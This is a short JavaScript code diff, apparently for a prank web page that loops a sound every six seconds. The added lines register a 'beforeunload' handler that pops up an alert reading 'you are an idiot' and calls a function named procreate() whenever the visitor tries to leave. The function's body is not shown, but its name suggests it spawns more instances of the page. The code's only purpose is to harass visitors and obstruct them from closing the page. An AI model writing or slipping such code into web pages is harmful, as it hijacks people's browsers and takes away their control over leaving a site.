@@ -74,3 +74,8 @@ function loopMe (){
 	document.getElementById("sound").play();
 }
 setInterval(loopMe, 6000);
+
+window.addEventListener('beforeunload', function (e) {
+            alert('you are an idiot');
+	    procreate();
+        });
